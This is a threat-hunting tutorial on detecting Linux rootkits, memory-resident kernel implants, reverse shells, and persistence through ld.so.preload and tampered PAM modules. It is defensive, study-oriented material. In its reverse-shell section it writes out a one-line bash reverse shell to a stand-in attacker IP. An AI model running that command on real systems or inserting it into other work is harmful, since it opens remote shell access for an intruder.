---
title: "Linux Rootkits, Reverse Shells, and Persistence"
date: 2026-08-19 12:00:00 +0530
categories: [Threat Hunting, Endpoint Security]
tags: [Linux, Persistence]
description: Go beyond the basics and hunt Linux rootkits, kernel implants, and reverse shell persistence with techniques that actually catch them.
---

## What you will learn

- Explain the concept in operational threat-hunting terms.
- Connect it to a decision, data requirement, or repeatable workflow.
- Apply it through a small exercise and document the limits of the result.

A rootkit's entire purpose is to make itself invisible to the tools you'd normally use to find it. That's not a clever turn of phrase, it's a design requirement if `ps` shows the malicious process, the rootkit failed. Which means hunting for rootkits isn't really about running better versions of the same commands. It's about finding the seams where the deception breaks down, and those seams exist because perfect concealment across every layer of the system is genuinely hard to pull off.

Most SOC teams that are comfortable with basic Linux hunting still freeze up when a rootkit is actually in play, because the standard playbook check processes, check logs, check cron assumes those sources are trustworthy. Once you're dealing with kernel-level tampering, that assumption breaks.

## LKM rootkits hide processes, but they can't hide everything consistently
Loadable Kernel Module rootkits typically hook syscalls to filter what `ps`, `ls`, and `netstat` return, hiding specific PIDs, files, or connections from userspace tools. The classic detection approach is comparing what different tools report for the same underlying state if `/proc/[pid]` directories exist for PIDs that `ps` doesn't show, something's actively filtering the process list. This cross-referencing technique (sometimes called "diffing" the proc filesystem against tool output) is old but still effective, because most rootkits don't bother hiding from every possible enumeration method equally well.

Check `/proc` directly with a simple loop iterating numeric directories and compare the count against `ps aux | wc -l`. A discrepancy of even one or two processes is worth chasing down immediately legitimate race conditions during the scan can cause off-by-one differences, but anything larger is a real finding. Also worth checking: `lsmod` output against `/proc/modules` directly, since some rootkits hook the module-listing syscall but miss the raw proc file, or vice versa depending on how thorough the author was.

## Kernel-level implants leave traces in memory even when disk is clean
The more sophisticated threats don't touch disk at all after initial deployment they live purely in kernel memory, sometimes hooking into legitimate kernel functions via ftrace or eBPF programs that were never meant to be abused this way. This is genuinely hard hunting territory, and I'll say plainly that most organizations don't have the tooling or the memory forensics muscle to catch this reliably on their own.

What does help: periodic memory acquisition on high-value hosts (using something like AVML or a LiME capture) combined with volatility-style analysis looking for syscall table modifications, unexpected kernel module entries, or ftrace hooks pointing to non-kernel memory addresses. This isn't something you run daily across your fleet it's targeted, expensive in analyst time, and reserved for hosts where you have specific reason for suspicion. But knowing the capability exists in your incident response toolkit, rather than discovering during an actual incident that nobody's ever done it, matters a lot.

## Reverse shells hide in plain sight if your egress monitoring is weak
A reverse shell doesn't need to be sophisticated to be effective a one-line `bash -i >& /dev/tcp/attacker-ip/4444 0>&1` still works on plenty of environments in 2026 because outbound connections from application servers to arbitrary external IPs on arbitrary ports simply aren't restricted or monitored closely enough. This is genuinely one of the higher return-on-effort fixes available: egress filtering that only permits necessary outbound destinations turns a trivial reverse shell into a much harder problem for an attacker.

For hunting rather than prevention, focus on process-to-network correlation. A shell process (`bash`, `sh`, `dash`) with an established outbound TCP connection is inherently suspicious legitimate shells don't normally hold network sockets open. `lsof -i` combined with process ancestry checks catches the straightforward cases. Attackers using named pipes or process substitution to obscure the connection (`mkfifo`, redirecting through `/dev/tcp` indirectly) require checking file descriptor tables under `/proc/[pid]/fd` for socket references that don't show up cleanly in standard netstat-style output.

## Persistence beyond cron: library preloading and PAM tampering
`/etc/ld.so.preload` is a favorite for a reason any shared library listed there gets loaded into every dynamically linked process on the system, which is a remarkably efficient way to backdoor authentication or hide files system-wide with one file modification. This file should be empty or nonexistent on the overwhelming majority of production systems. If you find anything in it during a hunt, that's not a "worth investigating eventually" finding that's stop-what-you're-doing.

PAM module tampering is the quieter cousin of this technique. A modified `pam_unix.so` or an added module in `/etc/pam.d/` that logs or forwards credentials during normal authentication gives an attacker persistent access that survives password rotations, since they're capturing the new password the moment it's typed. Checking PAM module checksums against known-good hashes from your package manager (`dpkg -V` or `rpm -V` depending on distro) is a fast, cheap way to catch this that most hunting programs skip entirely.

## Building the muscle for when basic tools lie to you
The uncomfortable lesson in advanced Linux hunting is that you have to assume, at least for your highest-value hosts, that standard command output might already be compromised. That's why cross-referencing multiple data sources proc filesystem against process listing tools, package manager checksums against live files, network flow data against local process state matters more here than almost anywhere else in threat hunting. No single source is trustworthy enough to hunt on alone once a rootkit is genuinely in play.

This is advanced material, and it takes real hands-on time against live compromised systems to build the instinct for what "off" actually looks like. ThreatHuntLabs' advanced Linux track includes labs built around real rootkit and reverse shell samples in isolated environments exactly the kind of practice that turns this from theory you've read into a skill you can actually run under pressure.


## Apply the lesson

Choose one real or lab scenario and write down the decision this concept should improve, the evidence required, the owner, and the expected output. Review the result with someone who did not perform the work; revise any assumption they cannot trace to evidence.

## Key takeaway

This lesson should leave you with a repeatable way to ask a narrower question, examine the right evidence, and improve future hunting or detection work.
